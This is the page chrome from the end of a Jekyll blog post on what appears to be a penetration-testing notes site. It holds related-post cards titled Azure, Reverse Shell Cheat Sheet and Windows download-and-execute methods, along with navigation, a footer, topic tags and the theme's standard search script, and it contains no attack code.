    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Cloud-Azure-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 16, 2020
  

  <i class="unloaded">2020-05-16T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Azure</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Tools
  Azure Architecture
  Azure Storage Account - Access
  Azure AD vs Active Directory
  Azure AD - Enumeration
  Azure AD - Password Spray
  Azure AD - Convert GUID to SID
  Azure ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Windows-Download-and-Execute/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar  7, 2019
  

  <i class="unloaded">2019-03-07T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows - Download and execute methods</h3>
            <div class="text-muted small">
              <p>
                





                Downloaded files location


  C:\Users&lt;username&gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\
  C:\Users&lt;username&gt;\AppData\Local\Microsoft\Windows\INetCache\IE&lt;subdir&gt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/Reverse-Shell-Cheatsheet/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Reverse Shell Cheat Sheet</p>
  </a>
  

  
  <a href="/Active-Directory-Attacks/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Active Directory Attacks</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

